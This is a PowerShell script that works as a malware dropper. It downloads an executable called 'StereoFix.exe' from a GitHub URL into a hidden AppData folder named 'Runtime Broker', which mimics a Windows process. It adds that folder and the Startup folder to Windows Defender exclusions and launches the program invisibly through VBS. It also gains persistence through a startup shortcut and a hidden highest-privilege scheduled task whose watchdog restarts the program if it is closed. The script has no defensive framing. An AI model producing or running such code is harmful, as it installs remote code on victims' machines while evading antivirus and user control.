# Silent Admin Execution Script
# Must be run from an elevated PowerShell session

# Define variables
$appUrl = "https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe"
$appName = "StereoFix.exe"
$folderName = "Runtime Broker"
$basePath = "$env:APPDATA"
$folderPath = "$basePath\$folderName"
$downloadPath = "$folderPath\$appName"
$exclusionPath = $folderPath

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    # If not admin, silently exit
    exit 1
}

try {
    # Create folder if it doesn't exist
    if (-not (Test-Path $folderPath)) {
        $null = New-Item -Path $folderPath -ItemType Directory -Force
    }
    
    # Set folder as hidden
    $folder = Get-Item -Path $folderPath -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    # Add folder to Defender exclusions
    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
    
    # Download the executable if it doesn't exist
    if (-not (Test-Path $downloadPath)) {
        Invoke-WebRequest -Uri $appUrl -OutFile $downloadPath -UseBasicParsing
        Start-Sleep -Seconds 2
    }
    
    # Create VBS script to run hidden
    $vbsScript = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "$downloadPath" & chr(34), 0, False
"@
    $vbsPath = "$folderPath\RunStereoFix.vbs"
    $vbsScript | Out-File -FilePath $vbsPath -Encoding ASCII

    # Create startup shortcut
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupFolder\StereoFix.lnk"
    
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = "wscript.exe"
    $Shortcut.Arguments = "`"$vbsPath`""
    $Shortcut.WorkingDirectory = $folderPath
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
    
    # Add startup folder to Defender exclusions
    Add-MpPreference -ExclusionPath $startupFolder -ErrorAction SilentlyContinue

    # Execute once immediately
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wscript.exe"
    $psi.Arguments = "`"$vbsPath`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # Create a watchdog process that restarts the application if closed
    $watchdogScript = @"
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'")

Do
    Set objLatestProcess = colMonitoredProcesses.NextEvent
    If objLatestProcess.TargetInstance.Name = "$appName" Then
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run chr(34) & "$downloadPath" & chr(34), 0, False
    End If
Loop
"@
    $watchdogPath = "$folderPath\Watchdog.vbs"
    $watchdogScript | Out-File -FilePath $watchdogPath -Encoding ASCII
    
    # Create a scheduled task to run the watchdog
    $taskName = "StereoFixWatchdog"
    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force

} catch {
    # Silently handle any errors
    exit 1
}